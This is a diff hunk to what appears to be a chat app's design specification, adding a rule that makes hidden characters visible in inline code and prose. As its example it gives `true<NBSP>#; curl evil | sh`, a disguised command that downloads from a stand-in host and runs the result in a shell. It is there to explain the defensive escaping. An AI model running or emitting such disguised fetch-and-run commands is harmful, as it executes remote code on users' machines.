@@ -1133,6 +1133,13 @@ joined words at a separator, since a fact can carry a delegate's name (#286).
     characters as their escapes as a code block draws them, cut at 500 characters at a whole
     grapheme with "…"; the whole text is read from its content. Its
     control type is said as the system says a list item.
+  - **Escapes in response text (#1319, the app and the PWA alike):** an inline code span is
+    escaped as a code block is (`HiddenText.Reveal`, right-to-left letters too; the PWA's `reveal`),
+    so `true<NBSP>#; curl evil | sh` draws its non-breaking space as `\u00A0`, and Copy keeps the
+    escape. Prose (text, link and image alt text) escapes only NEL, U+2028 and U+2029
+    (`HiddenText.RevealLineSeparators`; the PWA's `revealLineSeparators`); other prose is left as
+    written. A bare CR in prose is out of scope here: Markdig ends the line at it, so it never
+    reaches the text (a code block keeps and escapes it, #220).
   - **The keyboard reads it as a page, not a list:** the arrow keys scroll a line, Page Up and Page
     Down a viewport, Home and End (Ctrl too) to the top and the end, under reduced motion without
     animation; none moves between blocks, nor does any of them with Ctrl or Shift, and Left and
